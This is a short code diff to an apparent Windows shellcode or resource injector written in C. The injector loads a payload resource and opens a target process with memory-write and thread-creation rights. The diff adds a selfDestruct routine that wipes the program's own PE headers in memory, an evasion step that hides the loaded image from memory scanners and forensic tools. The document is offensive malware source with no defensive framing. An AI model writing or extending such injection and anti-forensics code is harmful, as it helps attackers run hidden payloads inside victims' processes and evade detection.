@@ -11,6 +11,28 @@ typedef NTSTATUS(WINAPI* pNtWriteVirtualMemory)(
 	PULONG NumberOfBytesWritten
 	);
 
+void selfDestruct() {
+	HANDLE hproc = GetModuleHandle(NULL);;
+	BYTE* baseAddr = (BYTE*)hproc;
+	IMAGE_DOS_HEADER image_dos_header;
+	ReadProcessMemory(GetCurrentProcess(), (LPCVOID)hproc, &image_dos_header, sizeof(image_dos_header), NULL);
+
+	LPCVOID nt_header_va = (LPBYTE)hproc + image_dos_header.e_lfanew;
+
+	IMAGE_NT_HEADERS64 image_nt_headers;
+	ReadProcessMemory(GetCurrentProcess(), nt_header_va, &image_nt_headers, sizeof(image_nt_headers), NULL);
+
+	DWORD sizeOfHeaders = image_nt_headers.OptionalHeader.SizeOfHeaders;
+
+	DWORD oldprotect;
+	if (VirtualProtect(baseAddr, sizeOfHeaders, PAGE_READWRITE, &oldprotect)) {
+		printf_s("%ld", GetLastError());
+	}
+	getchar();
+	SecureZeroMemory(baseAddr, sizeOfHeaders);
+
+	VirtualProtect(baseAddr, sizeOfHeaders, oldprotect, &oldprotect);
+}
 int main(int argc, char* argv[]) {
 	HRSRC hRsrc = NULL;
 	HGLOBAL hLoadRsrc = NULL;
@@ -50,6 +72,8 @@ int main(int argc, char* argv[]) {
 		return EXIT_FAILURE;
 	}
 	printf_s("[+] Got size (%d) of resource... \\------ (0x%p)\n", dSizeofRsrc, hRsrc);
+
+	selfDestruct();
 
 	if (!(hProc = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, NULL, PID))) {
 		printf_s("[-] Failed to get handle to process! \\------ (%ld)", GetLastError());
